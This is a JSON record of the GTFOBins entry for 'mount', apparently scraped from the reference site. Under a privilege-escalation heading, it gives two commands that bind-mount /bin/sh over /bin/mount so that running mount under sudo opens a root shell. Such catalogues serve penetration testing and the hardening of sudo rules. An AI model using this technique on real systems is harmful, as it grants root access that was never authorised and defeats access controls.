{"title": "mount", "source": "gtfobins", "source_label": "GTFOBins", "path": "mount", "html": "<h1>mount</h1>\n<h2>Privilege Escalation</h2>\n<p>This overrides `mount` itself with a shell (or any other executable).</p>\n<pre><code class=\"language-bash\">mount -o bind /bin/sh /bin/mount\nmount</code></pre>", "excerpt": "mount Privilege Escalation This overrides `mount` itself with a shell (or any other executable). mount -o bind /bin/sh /bin/mount mount", "tags": ["func:privilege-escalation", "ctx:sudo"]}